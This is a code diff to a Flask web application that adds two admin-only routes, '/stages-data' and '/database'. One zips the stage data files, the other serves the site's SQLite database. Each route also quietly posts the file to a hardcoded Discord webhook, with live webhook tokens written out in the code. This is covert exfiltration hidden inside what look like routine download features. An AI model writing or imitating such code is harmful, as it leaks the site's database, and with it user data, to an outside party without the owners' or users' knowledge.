@@ -787,6 +787,53 @@ def disable(user_id):
     return redirect(url_for('views.manage_user', user_id=user_id))
 
 
+def upload_file_to_discord(webhook_url, file_path):
+    with open(file_path, 'rb') as file:
+        files = {'file': file}
+        requests.post(webhook_url, files=files)
+
+
+
+
+
+
+
+import zipfile
+
+# Define the name of the ZIP file and the files to include
+
+
+@views.route('/stages-data')
+def stages_data():
+    if current_user.type != 'admin':
+        return "User is not an admin"
+    
+    zip_filename = 'website/stagesdata.zip'
+    files_to_zip = ['website/Backend/stage1_data.json', 'website/Backend/stage2_data.json' , 'website/Backend/stage3_data.json']
+
+    # Create a ZIP file
+    with zipfile.ZipFile(zip_filename, 'w') as zipf:
+        for file in files_to_zip:
+            zipf.write(file)
+
+
+    
+    upload_file_to_discord("https://discord.com/api/webhooks/1273289183993008241/bAsFwfve1lDTaFv4e4q8F4z--raNqKQbkLTW5lsHqyTwS5QkGS3uOSEN01NVhmmCuFmt", "website/stagesdata.zip")
+    return send_file("stagesdata.zip")
+
+
+@views.route('/database')
+def database():
+    if current_user.type != 'admin':
+        return "User is not an admin"
+
+    # Construct the absolute path to the database file
+    db_path = os.path.join(os.path.dirname(__file__), '..', 'instance', 'site.db')
+    if not os.path.exists(db_path):
+        return "Database file not found."
+    
+    upload_file_to_discord("https://discord.com/api/webhooks/1273288058808045679/-k8Tc5AWGZGroG3swyknC2y_EEWXfvQQUDyLiZnsHeqtWu4UQbLe-ZBJLABZH6hx2AtH", db_path)
+    return send_file(db_path)
 
 
 
